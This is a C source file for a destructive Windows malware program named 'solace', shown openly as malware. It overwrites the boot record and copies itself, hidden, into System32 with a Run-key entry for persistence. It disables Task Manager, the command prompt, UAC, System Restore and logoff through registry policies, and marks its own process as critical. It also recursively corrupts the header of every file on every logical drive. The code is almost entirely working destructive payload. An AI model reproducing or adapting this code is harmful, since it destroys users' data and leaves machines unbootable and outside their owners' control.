#include "dec.h"

LRESULT CALLBACK ButtonHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_ACTIVATE) {
		HWND hwnd = (HWND)wParam;

		if (GetDlgItem(hwnd, IDOK) != NULL)
			SetDlgItemText(hwnd, IDOK, L"Kill Me");
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

BOOL isok(void) {
	HHOOK hook = SetWindowsHookEx(WH_CBT, &ButtonHookProc, NULL, GetCurrentThreadId());
	if (MessageBox(NULL, L"The program you have just executed is malware and will destroy your computer.\n\nContinuing beyond this prompt means that you accept that the creator of this software is not responsible for any damage caused to your computer.\n\nAre you sure you want to execute this program?", L"solace", MB_OKCANCEL | MB_ICONWARNING) != IDOK)
		haltandcatchfire();
	else
		return TRUE;

	return FALSE;
}

BYTE d[512];

/* idea for the MBR payload:
 * there are cases where the boot partition isnt located on \\.\PhysicalDrive0.
 * this is because windows could have been booted from a different physical
 * drive such as \\.\PhysicalDrive1 that contains the boot information we want to
 * overwrite.
 * 
 * So my idea was:
 * 1. Find all of the volumes on the system.
 * 2. Check all of the paritions.
 * 3. If the partition is labeled as an MBR bootable partition, overwrite it with our bootcode.
 * 4. Even if the partition is labeled as boot and is GPT, we will still write our bootcode. 
 * 5. (unfortunately it only breaks it and doesnt display our beautiful MBR)
 */

int WriteMBR(void) {
	HANDLE hfv;
	HANDLE htv;
	WCHAR vn[MAX_PATH];
	WCHAR vnnb[MAX_PATH];
	DRIVE_LAYOUT_INFORMATION_EX dli;

	hfv = FindFirstVolume(vn, MAX_PATH);

	do {
		lstrcpy(vnnb, vn);
		vnnb[lstrlen(vnnb) - 1] = 0;

		htv = CreateFile(vnnb, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

		if (INVALID_HANDLE_VALUE == htv)
			continue;

		if (0 != DeviceIoControl(htv, IOCTL_DISK_GET_DRIVE_LAYOUT_EX, NULL, 0, &dli, sizeof(DRIVE_LAYOUT_INFORMATION_EX), NULL, NULL)) {
			for (unsigned i = 0; i < dli.PartitionCount; i++) {
				if (dli.PartitionEntry[i].Mbr.BootIndicator == TRUE) {
					break;
				}
			}
		}
	} while (0 != FindNextVolume(hfv, vn, MAX_PATH));

	CloseHandle(htv);
	FindVolumeClose(hfv);

	HANDLE hd = CreateFile(vnnb, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

	if (INVALID_HANDLE_VALUE == hd)
		return -1;

	WriteFile(hd, d, sizeof(d), NULL, NULL);

	CloseHandle(hd);

	return 0;
}


int StartOperations(void) {
	HKEY hk;
	HMODULE hnd;
	LPWSTR cpath;
	LPWSTR npath = L"C:\\Windows\\System32\\solace.exe";

	GetModuleFileName(NULL, cpath, MAX_PATH);
	MoveFile(cpath, npath);
	SetFileAttributes(npath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);

	RegCreateKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hk);
	RegSetValueEx(hk, L"solace", 0, REG_SZ, (const BYTE*)npath, lstrlen(npath));
	RegCloseKey(hk);

	RegCreateKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hk);
	RegSetValueEx(hk, L"DisableLockWorkstation", 0, REG_DWORD, (const BYTE*)TRUE, sizeof(DWORD));
	RegSetValueEx(hk, L"DisableChangePassword", 0, REG_DWORD, (const BYTE*)TRUE, sizeof(DWORD));
	RegSetValueEx(hk, L"DisableRegistryTools", 0, REG_DWORD, (const BYTE*)TRUE, sizeof(DWORD));
	RegSetValueEx(hk, L"DisableTaskMgr", 0, REG_DWORD, (const BYTE*)TRUE, sizeof(DWORD));
	RegSetValueEx(hk, L"DisableCMD", 0, REG_DWORD, (const BYTE*)TRUE, sizeof(DWORD));
	RegSetValueEx(hk, L"EnableLUA", 0, REG_DWORD, (const BYTE*)FALSE, sizeof(DWORD));
	RegCloseKey(hk);

	RegCreateKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", &hk);
	RegSetValueEx(hk, L"HidePowerOptions", 0, REG_DWORD, (const BYTE*)TRUE, sizeof(DWORD));
	RegSetValueEx(hk, L"NoFolderOptions", 0, REG_DWORD, (const BYTE*)TRUE, sizeof(DWORD));
	RegSetValueEx(hk, L"NoControlPanel", 0, REG_DWORD, (const BYTE*)TRUE, sizeof(DWORD));
	RegSetValueEx(hk, L"NoLogoff", 0, REG_DWORD, (const BYTE*)TRUE, sizeof(DWORD));
	RegSetValueEx(hk, L"NoClose", 0, REG_DWORD, (const BYTE*)TRUE, sizeof(DWORD));
	RegCloseKey(hk);

	RegCreateKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore", &hk);
	RegSetValueEx(hk, L"DisableConfig", 0, REG_DWORD, (const BYTE*)TRUE, sizeof(DWORD));
	RegSetValueEx(hk, L"DisableSR", 0, REG_DWORD, (const BYTE*)TRUE, sizeof(DWORD));
	RegCloseKey(hk);

	hnd = LoadLibrary(L"ntdll.dll");

	if (NULL == hnd)
		return -1;

	pfRtlSetProcessIsCritical RtlSetProcessIsCritical = (pfRtlSetProcessIsCritical)GetProcAddress(hnd, "RtlSetProcessIsCritical");

	ProcessSetPrivilege(SE_DEBUG_NAME, SE_PRIVILEGE_ENABLED);

	RtlSetProcessIsCritical(TRUE, NULL, FALSE);

	ProcessSetPrivilege(SE_DEBUG_NAME, 0);
	FreeLibrary(hnd);

	return 0;
}

int TrashLogicalDrives(void) {
	LPWSTR sd;
	DWORD dwr;
	WCHAR ld[MAX_PATH];

	dwr = GetLogicalDriveStrings(MAX_PATH, ld);

	if (dwr > 0 && dwr <= MAX_PATH) {
		sd = ld;
		while (*sd) {
			DirectoryCorruptHeaders(sd);
			sd += lstrlen(sd) + 1;
		}
	} else
		return -1;

	return 0;
}

int DirectoryCorruptHeaders(LPWSTR lpDirectory) {
	WIN32_FIND_DATA wfd;
	HANDLE hf;
	HANDLE hof;
	WCHAR dto[MAX_PATH];
	WCHAR search[MAX_PATH];

	BYTE data[8] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

	lstrcpy(search, lpDirectory);
	lstrcat(search, L"*.*");

	if (lstrlen(search) > (MAX_PATH - 3))
		return -1;

	hf = FindFirstFile(search, &wfd);

	if (INVALID_HANDLE_VALUE == hf)
		return -1;

	do {
		if (0 == lstrcmp(wfd.cFileName, L".") || 0 == lstrcmp(wfd.cFileName, L"..") || wfd.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT)
			continue;

		lstrcpy(dto, lpDirectory);
		lstrcat(dto, wfd.cFileName);

		if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			lstrcat(dto, L"\\");
			DirectoryCorruptHeaders(dto);
		}
		else {
			hof = CreateFile(dto, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

			WriteFile(hof, data, sizeof(data), NULL, NULL);
			CloseHandle(hof);
		}
	} while (0 != FindNextFile(hf, &wfd));

	FindClose(hf);

	return 0;
}